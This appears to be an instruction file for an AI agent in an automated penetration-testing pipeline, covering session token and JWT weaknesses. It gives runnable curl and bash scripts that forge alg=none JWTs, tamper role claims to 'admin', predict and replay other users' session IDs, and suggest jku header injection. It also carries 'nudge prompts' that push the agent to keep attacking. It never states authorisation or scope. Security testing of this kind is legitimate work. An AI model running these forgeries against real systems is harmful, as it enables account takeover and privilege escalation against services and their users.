---
name: session_token_analysis
agent: agent4_auth
description: Analyze session tokens for entropy, structure, JWT claim weaknesses, and cross-role privilege differences.
---

# Session Token Analysis

## Purpose

This skill tears session tokens apart: entropy measurement, structural decoding, JWT claim inspection, session-ID pattern analysis, and cross-role privilege comparison. Weak tokens are a direct path to account takeover — missing `exp`, client-controlled role claims, `alg=none` acceptance, predictable session IDs, or tokens that never expire turn one low-privilege account into admin access. You collect tokens from every issuance point, score each one with the helper, and prove every weakness with a live replay.

## Division of labor

- **Consumes:** credential samples from `findings/auth_model_mapping_confirmed.md` (cookie names, Authorization schemes), access to login/register/reset/guest endpoints, two accounts of different privilege levels if obtainable
- **Produces:** `findings/session_token_analysis_confirmed.md` — per-token scorecards (entropy, structure, claim inventory, flags), cross-role diff, and raw replay pairs for every CONFIRMED weakness

## When to use / when NOT to use

- **Use when:** you hold any token — session cookie, JWT, API key, reset token, guest token; login/register/reset endpoints exist; you have (or can create) two different-privilege accounts
- **Skip when (time-pass filter):** the target issues no tokens at all (pure cookieless static content, no login, no API auth observed) — ask: does it leak? Is it sensitive? Is it reachable unauthenticated? If there is no token surface, there is nothing to analyze. Do NOT run this on CSRF tokens alone unless they double as session identifiers.

## Methodology

1. **Collect tokens from every issuance point.** Hit each of these and save the raw `Set-Cookie` / body / header token: login (valid creds), login (remember-me on/off — compare), registration (new account), password reset request (the emailed token if you control the inbox; else the API response shape), guest/anonymous token endpoint, OAuth callback (code + issued tokens), API-key issuance endpoint, "impersonate"/"switch account" if present. Label each: `login-cookie`, `login-jwt`, `register`, `reset`, `guest`, `apikey`.
2. **Establish the baseline.** Pick a known-dead path on the same host. Record what an *invalid* token returns there (401 envelope, 403 envelope, redirect). Every later replay test compares against this — a 200 with a tampered token means nothing unless the invalid-token baseline is a clean deny on the same endpoint.
3. **Score every token with the helper.** Run `bin/token_analyzer.py --file tokens.txt` (one `LABEL<TAB>TOKEN` per line). Record: type (JWT vs opaque), length, Shannon entropy/char, effective bits, full claim inventory for JWTs, and every flag. Do not cherry-pick — score all of them.
4. **JWT claim inventory — inspect each claim by hand.** Decode header and payload. For each claim ask: `exp` missing? (never expires) `exp` - `iat` > 30 days? (overly long) `role`/`is_admin`/`scope` client-visible? (tamper target) `sub` = email or sequential integer? (enumeration/PII) `aud`/`iss` missing? (cross-audience acceptance) `jti` present? (revocation possible?) Custom claims — what do they authorize? Document every claim's apparent purpose.
5. **Test `alg=none` acceptance.** Take a valid JWT, replace header with `{"alg":"none","typ":"JWT"}`, drop the signature segment (keep the trailing dot: `h.p.`), and replay against an authenticated endpoint. Then try `alg=HS256` with an empty/garbage signature. Compare against the invalid-token baseline: 200 with data = CONFIRMED critical.
6. **Test role-claim tampering.** If payload carries `role`/`is_admin`/similar: re-sign is impossible without the secret — instead test whether the server actually *validates* the signature. Craft a payload with `role":"admin"` (or `"is_admin":true`), keep the original signature bytes (now invalid), and replay. If accepted → signature not verified → CONFIRMED. If rejected, try `alg=none` variant from step 5 and the `jku`/`x5u` header-injection variant (point `jku` at your collaborator URL serving a JWK — only if you have out-of-band infrastructure; note INCONCLUSIVE otherwise).
7. **Test `exp` enforcement.** Take a valid token, craft an expired copy (if unsigned-accept from step 5/6 works) — or simpler: hold a short-lived token past its `exp` and replay it. If the server honors an expired token, expiry is decorative — CONFIRMED. Also test a token with `exp` far in the future / `iat` in the future.
8. **Opaque session-ID pattern analysis.** Collect 10-20 session IDs (register 10 accounts, or login/logout 10 times). Check: sequential or incrementing? (`sess_000042` → `sess_000043` = game over) timestamp-derived? (leading digits decode to a plausible unix time — the helper flags this) low entropy (< 3.5 bits/char)? short (< 128 effective bits)? shared prefix suggesting a counter + weak random suffix? If sequential: predict the next ID, replay it, and see if you land in another live session — CONFIRMED only when a predicted ID authenticates as a different session.
9. **Cross-role privilege comparison.** With a low-priv and high-priv (or admin, if legitimately obtained) account, capture both tokens and run `token_analyzer.py --compare low.txt high.txt`. The claim diff is your tamper shopping list: every claim present only in the high-priv token is a candidate to forge (given a signature-bypass from steps 5-6) or to request via the issuance endpoint with parameter tampering (`role=admin` on register/token-mint — test it).
10. **Test token binding.** Is the token bound to IP? to User-Agent? to the session that requested it (reset tokens)? Replay a valid token from a different IP (if you have egress variety) and with a mangled User-Agent. If binding exists, note it — it raises the bar for token-theft findings but does not erase them. If a reset token works without the requesting session's cookies, it is unbound — note that.
11. **Test logout / revocation.** Log out, then replay the old token. If it still works 5+ minutes later, there is no server-side revocation — session persists after logout. Change the account password, replay the old token again: still valid = failure to rotate on credential change. Both are real findings (session-management weakness), severity scaled by token lifetime.
12. **Test concurrent-session and fixation behavior.** Log in twice — do you get the same token (fixation-prone) or two tokens (are both valid simultaneously)? Try session fixation directly: set a victim-style cookie value *before* login (if the app accepts a pre-set session cookie and keeps it post-login, that is fixation — CONFIRMED only with a real pre/post login pair).
13. **Remember-me / long-lived token analysis.** Compare the normal token vs remember-me token: longer TTL? different format? stored in a separate cookie? A remember-me token with 1-year TTL and no rotation is a theft-persistence finding — verify by replaying it after the short session expires.
14. **API-key entropy and scope.** If API keys exist: measure entropy the same way, check for guessable prefixes (`sk_live_` + short suffix), test whether a key minted for scope `read` can write (scope enforcement), and whether keys are shown only once or re-displayable (re-displayable = stored reversibly — note it).
15. **Replay every weakness twice, independently.** Each CONFIRMED claim (alg=none, role tamper, expired accepted, predicted session ID, no-revocation) gets two independent replays: fresh shell, fresh timestamp, same result. Save both raw pairs. If the second run fails (WAF, expiry race), do a third; majority rules, else INCONCLUSIVE.
16. **Decision branch — token is a properly-signed JWT with short exp, no role claims, strong entropy:** that token is NEGATIVE as a direct target. Pivot: attack the *issuance* (register with `role=admin` param — step 9), the *refresh* flow (is the refresh token weaker than the access token? often it is), and *storage* (JWT in `localStorage` + any XSS = theft; note for the XSS agent).
17. **Decision branch — opaque token with high entropy but sequential-looking prefix:** collect 20+ samples before concluding. Plot or list them sorted — monotonic increase across time = counter. One predicted-valid session = CONFIRMED; prediction fails 3x = NEGATIVE (document the samples so nobody re-collects).
18. **Write the artifact.** Per-token scorecards + cross-role diff + replay verdicts, each CONFIRMED item linked to its two raw replay pairs.

## Exact commands

Baseline — invalid-token behavior on a live authenticated endpoint (run first):

```bash
TARGET="<TARGET>"; EP="/api/users/me"
echo "=== invalid token baseline ==="
curl -sk -o /tmp/tb_body.txt -w "%{http_code} %{size_download}\n" \
  -H "Authorization: Bearer invalid-token-xyz-123" "https://$TARGET$EP"
head -c 400 /tmp/tb_body.txt; echo
echo "=== valid token (for shape comparison) ==="
curl -sk -o /tmp/tv_body.txt -w "%{http_code} %{size_download}\n" \
  -H "Authorization: Bearer <TOKEN>" "https://$TARGET$EP"
head -c 400 /tmp/tv_body.txt; echo
```

Collect tokens from issuance points (label everything):

```bash
TARGET="<TARGET>"
mkdir -p /tmp/tokens
# login
curl -sk -D /tmp/tokens/login.hdrs -o /tmp/tokens/login.body -X POST "https://$TARGET/api/login" \
  -H "Content-Type: application/json" -d '{"email":"<LOWPRIV_EMAIL>","password":"<LOWPRIV_PASS>"}'
grep -i '^set-cookie' /tmp/tokens/login.hdrs
python3 -c "import json;d=json.load(open('/tmp/tokens/login.body'));print({k:v[:40] for k,v in d.items() if 'token' in k.lower()})" 2>/dev/null
# register (fresh account -> fresh token sample)
curl -sk -D /tmp/tokens/register.hdrs -o /tmp/tokens/register.body -X POST "https://$TARGET/api/register" \
  -H "Content-Type: application/json" -d '{"email":"testuser'$RANDOM'@example.com","password":"TestPass123!"}'
# guest token endpoint (if observed in JS)
curl -sk -D /tmp/tokens/guest.hdrs "https://$TARGET/api/guest/token" -o /tmp/tokens/guest.body -w "%{http_code}\n"
```

Score tokens with the helper:

```bash
# tokens.txt format: LABEL<TAB>TOKEN  (one per line)
printf 'login-jwt\t<TOKEN>\nlogin-cookie\t<COOKIE_VALUE>\nguest\t<GUEST_TOKEN>\n' > /tmp/tokens/tokens.txt
python3 bin/token_analyzer.py --file /tmp/tokens/tokens.txt
python3 bin/token_analyzer.py --file /tmp/tokens/tokens.txt --json > /tmp/tokens/scores.json
```

alg=none forgery test:

```bash
TARGET="<TARGET>"; EP="/api/users/me"
T="<TOKEN>"
H=$(echo -n "$T" | cut -d. -f1); P=$(echo -n "$T" | cut -d. -f2)
HNONE=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
NONE="$HNONE.$P."
echo "=== alg=none replay ==="
curl -sk -o /tmp/none_body.txt -w "%{http_code} %{size_download}\n" \
  -H "Authorization: Bearer $NONE" "https://$TARGET$EP"
head -c 400 /tmp/none_body.txt; echo
# compare status against the invalid-token baseline above: 200+data vs baseline deny
```

Role-claim tamper test (unsigned payload swap, original signature kept):

```bash
TARGET="<TARGET>"; EP="/api/users/me"
T="<TOKEN>"
H=$(echo -n "$T" | cut -d. -f1); S=$(echo -n "$T" | cut -d. -f3)
PADMIN=$(echo -n "$T" | cut -d. -f2 | base64 -d 2>/dev/null | \
  python3 -c "import json,sys,base64; d=json.load(sys.stdin); d['role']='admin'; d['is_admin']=True; print(base64.urlsafe_b64encode(json.dumps(d).encode()).decode().rstrip('='))")
FORGED="$H.$PADMIN.$S"
for i in 1 2; do
  echo "=== role-tamper run $i $(date -u +%FT%TZ) ==="
  curl -sk -o /tmp/tamper_$i.body -w "%{http_code} %{size_download}\n" \
    -H "Authorization: Bearer $FORGED" "https://$TARGET$EP"
  head -c 400 /tmp/tamper_$i.body; echo
done
```

Session-ID sequence prediction test (collect N samples first):

```bash
TARGET="<TARGET>"
for i in $(seq 1 12); do
  curl -sk -D - -o /dev/null -X POST "https://$TARGET/api/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"<LOWPRIV_EMAIL>","password":"<LOWPRIV_PASS>"}' 2>/dev/null | \
    grep -i '^set-cookie: *session=' | sed 's/.*session=//;s/;.*//' 
  sleep 1
done | tee /tmp/tokens/sess_samples.txt | sort | uniq -c | sort -n
# if sequential: take last sample, increment, replay:
# curl -sk -b "session=<PREDICTED_NEXT>" "https://$TARGET/api/users/me" -w "%{http_code}\n"
```

Logout/password-change revocation test:

```bash
TARGET="<TARGET>"; EP="/api/users/me"; T="<TOKEN>"
curl -sk -X POST "https://$TARGET/api/logout" -H "Authorization: Bearer $T" -o /dev/null -w "logout -> %{http_code}\n"
sleep 5
for i in 1 2; do
  echo "=== post-logout replay $i ==="
  curl -sk -o /tmp/revoke_$i.body -w "%{http_code} %{size_download}\n" -H "Authorization: Bearer $T" "https://$TARGET$EP"
done
```

Cross-role comparison:

```bash
echo '<LOWPRIV_JWT>' > /tmp/tokens/low.txt
echo '<HIGHPRIV_JWT>' > /tmp/tokens/high.txt
python3 bin/token_analyzer.py --compare /tmp/tokens/low.txt /tmp/tokens/high.txt
```

## Completion-bias defenses

- [ ] Tokens collected from ALL issuance points (login ± remember-me, register, reset, guest, OAuth callback, API-key issuance, impersonate)
- [ ] Invalid-token baseline recorded on a live authenticated endpoint
- [ ] Every token scored with token_analyzer.py (entropy, length, flags) — none skipped
- [ ] JWT claim inventory done by hand: exp/iat/aud/iss/jti/sub/role/custom claims each judged
- [ ] alg=none forgery tested and compared against baseline
- [ ] Role-claim tamper tested (unsigned payload swap with original signature)
- [ ] exp enforcement tested (expired token replayed; future exp/iat probed)
- [ ] 10-20 opaque session IDs collected and analyzed for sequence/timestamp/low-entropy patterns
- [ ] If sequential pattern found: next-ID prediction replayed against a live session
- [ ] Cross-role token diff run (low-priv vs high-priv claim diff)
- [ ] Token binding tested (IP / User-Agent / requesting-session)
- [ ] Logout revocation tested; password-change rotation tested
- [ ] Concurrent-session + fixation behavior tested (double login, pre-set cookie)
- [ ] Remember-me token compared against normal token (TTL, format, separate cookie)
- [ ] API-key entropy, scope enforcement, and re-displayability checked (if API keys exist)
- [ ] Every CONFIRMED weakness replayed 2x independently with matching results
- [ ] Decision branches applied (strong token → pivot to issuance/refresh/storage; sequential-looking → 20+ samples)
- [ ] Artifact written with scorecards, diffs, verdicts, raw-pair links
- **Review step:** agent10_review must verify: (1) token_analyzer.py output (or scores.json) exists for every collected token; (2) each CONFIRMED forgery/tamper claim has 2x timestamped replay pairs showing 200+data vs the invalid-token baseline deny; (3) no verdict of "predictable session ID" without a successful predicted-ID authentication; (4) raw tokens are not pasted into chat-facing summaries beyond truncated prefixes.
- **Nudge prompts:** "Keep going until you have collected tokens from every issuance point, not just login." / "Do not report done before findings/session_token_analysis_confirmed.md exists on disk with per-token scorecards." / "A flag from the helper is a lead, not a finding — replay it live twice before you claim CONFIRMED."
- **Finished artifact definition:** `findings/session_token_analysis_confirmed.md` — per-token scorecard table (label, type, length, entropy, flags), JWT claim inventory, cross-role claim diff, and for every CONFIRMED weakness two raw replay pairs under `findings/raw/session_token_analysis_<n>.txt` (full request + response).

## Evidence standard

- Baseline: invalid-token response on the same endpoint recorded first; every forgery/tamper success is judged against that deny envelope
- Reproduction: 2x independent replays, timestamped; body hashes must match (modulo timestamps)
- Raw evidence: full request/response pairs saved — forged token value (or its truncated form + construction method), response status/headers/body
- Verdicts: CONFIRMED (baseline-denied invalid token vs 200+data with forged/tampered/predicted/expired token, 2x) / INCONCLUSIVE (needs second-model run or human — e.g. jku/x5u without collaborator infra, flaky expiry races) / NEGATIVE (properly validated signature + short exp + high entropy + real revocation — documented with scores so nobody re-tests)

## Handoffs

- **Auth-model-mapping skill:** consumes token-type classification and which schemes the server actually validates (feeds the matrix)
- **IDOR / privilege-escalation skill:** consumes role-claim tamper successes and cross-role claim diffs — needs the forged token construction and which endpoints honored it
- **XSS agent:** consumes storage findings (JWT in localStorage + lifetime) — needs token location, TTL, and whether HttpOnly was absent
- **Session-fixation follow-up:** consumes pre/post-login cookie behavior — needs the exact Set-Cookie sequences
- **agent10_review:** consumes `findings/session_token_analysis_confirmed.md` + scores.json + raw pairs; verifies baseline discipline and 2x repro before anything ships
